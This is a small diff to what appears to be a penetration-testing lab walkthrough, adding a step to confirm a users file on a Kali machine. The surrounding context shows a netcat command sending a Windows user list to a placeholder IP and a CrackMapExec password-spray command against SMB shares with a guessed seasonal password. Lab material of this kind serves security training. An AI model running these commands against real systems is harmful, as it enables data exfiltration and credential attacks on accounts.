@@ -60,6 +60,10 @@ C:\Tools> `nc <IP> 2222 < ..\temp\UserList.txt` (Cancel out netcat (Ctrl-C) afte
 
 ![](attachments/win-netcat.png)
 
+Check that users file exists in home directory of clabs (/home/clabs):
+
+![](attachments/kali-home.png)
+
 We will use the tool CrackMapExec for password spray attack over smb. The tool supports other protocols like ssh, winrm, ldap etc. 
 
 The command looks like this - `cme smb <IP> -u users -p Winter2020 --shares`.
